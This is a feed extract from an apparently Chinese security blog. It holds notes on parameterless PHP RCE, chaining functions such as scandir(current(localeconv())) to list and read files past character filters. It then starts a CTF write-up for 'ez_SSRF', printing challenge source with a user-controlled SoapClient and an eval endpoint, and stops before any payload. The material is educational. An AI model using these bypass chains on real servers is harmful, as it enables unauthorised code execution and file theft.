    <content type="html"><![CDATA[<h1 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1><p>无参<code>RCE</code>就是无法使用参数，只能使用函数来达到命令执行的效果</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a><code>localeconv()</code></h3><p>这个函数可以获取当前地区的数字和货币信息</p><p>**传入值：**无需传入参数</p><p>**返回值：**返回内容是一个包含众多格式化设置的关联数组</p><p>数组中的第一个元素是点</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416003019393.png" alt="image-20250416003019393"></p><h3 id="current"><a href="#current" class="headerlink" title="current()"></a><code>current()</code></h3><p>获取数组的当前元素</p><p>**传入值：**一个数组</p><p>**返回值：**这个函数会返回数组中的当前元素，在每一个数组中都有一个内部指针指向这某个元素，默认情况下指向第一个元素</p><p>这个可以与<code>localeconv()</code>搭配使用，从而获取<code>localeconv()</code>返回的数组中的第一个元素点<code>.</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416004146301.png" alt="image-20250416004146301"></p><h3 id="pos"><a href="#pos" class="headerlink" title="pos()"></a><code>pos()</code></h3><p>这个函数是<code>current()</code> 的别名函数，和其作用一样是获取数组的当前元素</p><p>**传入值：**一个数组</p><p>**返回值：**这个函数会返回数组中的当前元素，在每一个数组中都有一个内部指针指向这某个元素，默认情况下指向第一个元素</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416134932036.png" alt="image-20250416134932036"></p><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h3><p>这个函数可以获取当前目录的文件和子目录</p><p>**传入值：**接收参数是要扫描的路径</p><p>**返回值：**返回值是该目录包含的文件和目录的数组</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">(<span class="hljs-string">&#x27;.&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416002528162.png" alt="image-20250416002528162"></p><p>因为是无参RCE，所以引号和点这些符号可能会禁用，就要和<code>localeconv()</code>和<code>current</code>搭配使用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416004214299.png" alt="image-20250416004214299"></p><h3 id="glob"><a href="#glob" class="headerlink" title="glob()"></a><code>glob()</code></h3><p>这是一个用于文件路径名模式匹配的函数，可以获取包含匹配文件路径的数组</p><p>**传入值：**要匹配的文件路径名</p><p>**返回值：**一个包含匹配文件路径的数组</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">glob</span><span class="hljs-params">(<span class="hljs-string">&#x27;*&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416145431516.png" alt="image-20250416145431516"></p><h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a><code>getcwd()</code></h3><p>获取当前工作目录的绝对路径</p><p>**传入值：**这个函数无需传入参数</p><p>**返回值：**会返回当前工作目录的绝对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getcwd</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416004954555.png" alt="image-20250416004954555"></p><h3 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a><code>dirname()</code></h3><p>获取路径中的目录部分</p><p>**传入值：**这个函数会接收一个路径参数</p><p>**返回值：**返回路径中的目录部分</p><p>可以和<code>getcwd()</code>搭配使用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416004933056.png" alt="image-20250416004933056"></p><h3 id="array-flip"><a href="#array-flip" class="headerlink" title="array_flip()"></a><code>array_flip()</code></h3><p>这个函数可以交换数组中键和值的位置</p><p>**传入值：**会接收一个数组</p><p>**返回值：**返回一个键和值交换位置的数组</p><p>可以和<code>scandir(current(localeconv()))</code>搭配使用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416005304766.png" alt="image-20250416005304766"></p><h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a><code>array_reverse()</code></h3><p>这个函数会将数组中的元素颠倒过来</p><p>**传入值：**接收一个数组</p><p>**返回值：**返回一个颠倒的数组</p><p>当要选取的文件在靠后的位置时，可以使用这个函数使其提前</p><p>可以和<code>array_flip(scandir(current(localeconv())))</code>搭配使用，</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_reverse</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416010045017.png" alt="image-20250416010045017"></p><h3 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a><code>array_rand()</code></h3><p>这个函数可以从一个数组中随机抽取一个或多个键</p><p>**传入值：**会接收一个数组，如果没有指定选取键的数量会默认为1</p><p>**返回值：**会返回随机选取的键</p><p>可以和<code>array_rand(array_flip(scandir(current(localeconv()))))</code>搭配使用，从而达到随机选取文件的效果</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416005715362.png" alt="image-20250416005715362"></p><h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a><code>chdir()</code></h3><p>这个函数会改变当前脚本的工作目录</p><p>**传入值：**需要接收目标目录的路径</p><p>**返回值：**返回值是布尔类型</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416134329290.png" alt="image-20250416134329290"></p><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a><code>strrev()</code></h3><p>这个函数可以将字符串反转</p><p>**传入值：**要进行反转的字符串</p><p>**返回值：**反转后的字符串</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strrev</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416134617004.png" alt="image-20250416134617004"></p><h3 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h3><p>可以将数组内部指针移动到最后一个元素</p><p>**传入值：**要操作的数组</p><p>**返回值：**返回数组的最后一个元素的值</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416150215077.png" alt="image-20250416150215077"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416150230880.png" alt="image-20250416150230880"></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a><code>next()</code></h3><p>可以将数组的内部指针向前移动一位</p><p>**传入值：**要操作的数组</p><p>**返回值：**返回移动后内部指针所指向的元素的值，如果超出数组范围会返回<code>false</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416150716805.png" alt="image-20250416150716805"></p><h3 id="prev"><a href="#prev" class="headerlink" title="prev()"></a><code>prev()</code></h3><p>将数组的内部指针倒回一位</p><p>**传入值：**要操作的数组</p><p>**返回值：**返回倒回后内部指针指向的元素的值，如果超出数组范围会返回<code>false</code></p><h3 id="reset"><a href="#reset" class="headerlink" title="reset()"></a><code>reset()</code></h3><p>将数组内部指针重置到第一个元素</p><p>**传入值：**要操作的数组</p><p>**返回值：**返回重置后的内部指针指向的元素的值，即数组第一个元素的值</p><h3 id="each"><a href="#each" class="headerlink" title="each()"></a><code>each()</code></h3><p>可以获取当前数组内部指针指向的元素的键和值，并将指针向后移动一位</p><p>**传入值：**要操作的数组</p><p>**返回值：**返回一个包含四个元素的数组，键 <code>0</code> 和 <code>key</code> 对应元素的键，键 <code>1</code> 和 <code>value</code> 对应元素的值。如果数组指针已经超出数组范围，返回 <code>false</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">each</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416152519020.png" alt="image-20250416152519020"></p><h3 id="ord"><a href="#ord" class="headerlink" title="ord()"></a><code>ord()</code></h3><p>获取字符串中第一个字符的ASCII码值</p><p>**传入值：**要处理的字符串</p><p>**返回值：**字符串中第一个字符的ASCII码值</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416152845903.png" alt="image-20250416152845903"></p><h3 id="chr"><a href="#chr" class="headerlink" title="chr()"></a><code>chr()</code></h3><p>和<code>ord()</code>函数功能相反，这个函数是将ASCII码值转化为字符</p><p>**传入值：**ASCII码值</p><p>**返回值：**返回ASCII码值对应的字符</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416153117794.png" alt="image-20250416153117794"></p><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h3><p>这个函数可以获取全部的 HTTP 请求头</p><p>**传入值：**无需传入参数</p><p>**返回值：**会返回一个包含请求头的数组，键为请求头，值为请求头的值</p><p>不过这个函数只能在 Apache 环境中使用，其他环境不能用</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416002041599.png" alt="image-20250416002041599"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h3><p>这个函数可以返回所有已定义变量的数组，包括全局变量、局部变量、超全局变量等</p><p>**传入值：**不需要传入参数</p><p>**返回值：**返回一个包含所有已定义变量的关联数组</p><p>不过这个函数只能在 Apache 环境中使用，其他环境不能用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">get_defined_vars</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416161045908.png" alt="image-20250416161045908"></p><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h3><p>这个函数可以获取或设置当前会话的 Session ID</p><p>**传入值：**不需要传入参数</p><p>**返回值：**返回当前会话的 ID，如果没有就会返回一个空字符串</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">session_id</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E6%95%B0/image-20250416161445970.png" alt="image-20250416161445970"></p><h3 id="读取文件内容函数"><a href="#读取文件内容函数" class="headerlink" title="读取文件内容函数"></a>读取文件内容函数</h3><ul><li><code>highlight_file()</code></li><li><code>show_source()</code></li><li><code>readfile()</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无参RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024第十五届极客大挑战--Web-ez_SSRF</title>
    <link href="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/"/>
    <url>/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/</url>
    
    <content type="html"><![CDATA[<p>题目来源：2024第十五届极客大挑战–<code>ez_SSRF</code></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250330220602797.png" alt="image-20250330220602797"></p><p>源码中得不到什么信息，用<code>dirsearch</code>扫描目录</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250330220602797.png" alt="image-20250330220645437"></p><p>可以扫出<code>/www.zip</code>文件，访问下载到源码，有如下三个文件</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250330220805852.png" alt="image-20250330220805852"></p><p>先看看<code>index.php</code>文件，不过没啥用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Maybe you should check check some place in my website&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再看看<code>h4d333333.php</code>文件，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭所有错误报告，这样在代码运行时出现的错误不会显示给用户</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// 检查是否通过 POST 方法提交了 &#x27;user&#x27; 参数</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 如果没有提交，将用户名设为 &#x27;stranger&#x27;</span><br>    <span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;stranger&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果提交了，将提交的用户名赋值给 $user 变量</span><br>    <span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><span class="hljs-comment">// 检查是否通过 GET 方法提交了 &#x27;location&#x27; 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果提交了，将提交的服务地址赋值给 $location 变量</span><br>    <span class="hljs-variable">$location</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>];<br>    <span class="hljs-comment">// 创建一个新的 SOAP 客户端实例</span><br>    <span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>        <span class="hljs-comment">// 设置 SOAP 服务的地址</span><br>        <span class="hljs-string">&quot;location&quot;</span>=&gt;<span class="hljs-variable">$location</span>,<br>        <span class="hljs-comment">// 设置 SOAP 服务的命名空间，这里为 &#x27;hahaha&#x27;</span><br>        <span class="hljs-string">&quot;uri&quot;</span>=&gt;<span class="hljs-string">&quot;hahaha&quot;</span>,<br>        <span class="hljs-comment">// 设置连接 SOAP 服务的用户名</span><br>        <span class="hljs-string">&quot;login&quot;</span>=&gt;<span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-comment">// 设置连接 SOAP 服务的密码</span><br>        <span class="hljs-string">&quot;password&quot;</span>=&gt;<span class="hljs-string">&quot;gueeeeest!!!!&quot;</span>,<br>        <span class="hljs-comment">// 设置 HTTP 请求头中的 User-Agent，包含用户名</span><br>        <span class="hljs-string">&quot;user_agent&quot;</span>=&gt;<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;s Chrome&quot;</span><br>    ));<br>    <span class="hljs-comment">// 调用 SOAP 服务端的 calculator 方法</span><br>    <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">calculator</span>();<br>    <span class="hljs-comment">// 读取 &#x27;result&#x27; 文件的内容并输出</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;result&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果没有提交 &#x27;location&#x27; 参数，提示用户提供</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please give me a location&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>审计代码</p><p>POST传参<code>user</code>，初始会被赋值为<code>stranger</code>，GET传参<code>location</code>，然后创建了一个新的 SOAP 客户端实例，其地址就是 GET 传参<code>location</code>的值，命名空间为<code>hahaha</code>，连接这个服务的用户名是<code>guest</code>，密码是<code>gueeeeest!!!!</code>，设置 HTTP 请求头中的 User-Agent，包含用户名，这里是将POST传参<code>user</code>的内容和<code>&#39;s Chrome</code>拼接到一起，然后调用 SOAP 服务端的 <code>calculator</code> 方法，读取<code>result</code>文件的内容并输出</p><p>最后就是查看<code>calculator.php</code>文件，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 定义管理员用户名</span><br><span class="hljs-variable">$admin</span>=<span class="hljs-string">&quot;aaaaaaaaaaaadmin&quot;</span>;<br><span class="hljs-comment">// 定义管理员密码</span><br><span class="hljs-variable">$adminpass</span>=<span class="hljs-string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;<br><span class="hljs-comment">// 定义一个用于检查 HTTP 认证信息的函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$auth</span></span>) </span>&#123;<br>    <span class="hljs-comment">// 声明使用全局变量 $admin 和 $adminpass</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$admin</span>,<span class="hljs-variable">$adminpass</span>;<br>    <span class="hljs-comment">// 去除认证信息中的 &quot;Basic &quot; 前缀</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;Basic &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// 对去除前缀后的认证信息进行 Base64 解码</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// 使用冒号分割解码后的认证信息，得到用户名和密码</span><br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// 输出用户名和密码，方便调试</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$password</span>;<br>    <span class="hljs-comment">// 检查用户名和密码是否与管理员的用户名和密码匹配</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-variable">$admin</span> &amp;&amp; <span class="hljs-variable">$password</span>===<span class="hljs-variable">$adminpass</span>) &#123;<br>        <span class="hljs-comment">// 如果匹配，返回 1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果不匹配，返回 2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 检查请求的客户端 IP 地址是否为本地地址 127.0.0.1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-comment">// 如果不是本地地址，输出 &quot;Hacker&quot; 并终止脚本执行</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 获取 POST 请求中名为 &quot;expression&quot; 的参数值，即要计算的数学表达式</span><br><span class="hljs-variable">$expression</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;expression&#x27;</span>];<br><span class="hljs-comment">// 获取 HTTP 请求头中的 &quot;Authorization&quot; 字段的值，即认证信息</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];<br><span class="hljs-comment">// 检查是否存在认证信息</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$auth</span>))&#123;<br>    <span class="hljs-comment">// 调用 check 函数检查认证信息</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$auth</span>)===<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-comment">// 如果认证失败（返回值为 2）</span><br>        <span class="hljs-comment">// 检查表达式是否只包含数字和四则运算符</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="hljs-variable">$expression</span>)) &#123;<br>            <span class="hljs-comment">// 如果表达式不符合要求，输出 &quot;Invalid expression&quot; 并终止脚本执行</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid expression&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// 如果表达式符合要求，使用 eval 函数计算表达式的值</span><br>            <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>            <span class="hljs-comment">// 将计算结果写入 &quot;result&quot; 文件</span><br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果认证成功（返回值不为 2）</span><br>        <span class="hljs-comment">// 直接使用 eval 函数计算表达式的值</span><br>        <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>        <span class="hljs-comment">// 将计算结果写入 &quot;result&quot; 文件</span><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>    